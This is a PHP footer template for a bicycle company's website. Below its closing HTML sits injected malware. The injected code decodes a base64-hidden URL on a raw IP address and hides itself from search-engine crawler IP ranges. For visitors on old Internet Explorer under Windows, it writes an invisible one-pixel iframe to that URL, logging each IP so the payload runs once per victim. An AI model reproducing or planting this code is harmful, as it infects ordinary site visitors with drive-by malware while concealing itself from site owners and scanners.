<?php //$current_site = get_current_site(); ?>

<hr />

<div id="footer">

	<p style="float:left">Affinity Cycles | info@affinitycycles.com

    <p style="float:right">© 2008 - 2013 Affinity Cycles LLC. </p>

</div>

</div>



</body>

</html>





<?



function net_match ( $network , $ip ) {

$ip_arr = explode ( '/' , $network );

$network_long = ip2long ( $ip_arr [ 0 ]);

$x = ip2long ( $ip_arr [ 1 ]);

$mask = long2ip ( $x ) == $ip_arr [ 1 ] ? $x : 0xffffffff << ( 32 - $ip_arr [ 1 ]);

$ip_long = ip2long ( $ip );

return ( $ip_long & $mask ) == ( $network_long & $mask );

}





$ip=$_SERVER['REMOTE_ADDR'];



$user_agent = $_SERVER['HTTP_USER_AGENT'];





$user_agent = $_SERVER["HTTP_USER_AGENT"];



$IP = $_SERVER['REMOTE_ADDR'].".log";



@mkdir('/tmp/384-5181/');



$dfjgkbl=base64_decode('aHR0cDovLzY1Ljc1LjE0OC4xMzQvSG9tZS9pbmRleC5waHA=');



if(!file_exists("/tmp/384-5181/{$IP}"))

{





if(

net_match('64.233.160.0/19',$ip)==0 &&

net_match('66.102.0.0/20',$ip)==0 &&

net_match('66.249.64.0/19',$ip)==0 &&

net_match('72.14.192.0/18',$ip)==0 &&

net_match('74.125.0.0/16',$ip)==0 &&

net_match('89.207.224.0/24',$ip)==0 &&

net_match('193.142.125.0/24',$ip)==0 &&

net_match('194.110.194.0/24',$ip)==0 &&

net_match('209.85.128.0/17',$ip)==0 &&

net_match('216.239.32.0/19',$ip)==0 &&

net_match('128.111.0.0/16',$ip)==0 &&

net_match('67.217.0.0/16',$ip)==0 &&

net_match('188.93.0.0/16',$ip)==0

)



{

if(strpos($user_agent, "Windows") !== false)

{

if (preg_match("/MSIE 6.0/", $user_agent) OR

    preg_match("/MSIE 7.0/", $user_agent) OR

    preg_match("/MSIE 8.0/", $user_agent)

)

{

echo '<iframe frameborder=0 src="'.$dfjgkbl.'" width=1 height=1 scrolling=no></iframe>';



touch ("/tmp/384-5181/{$IP}");



}}}}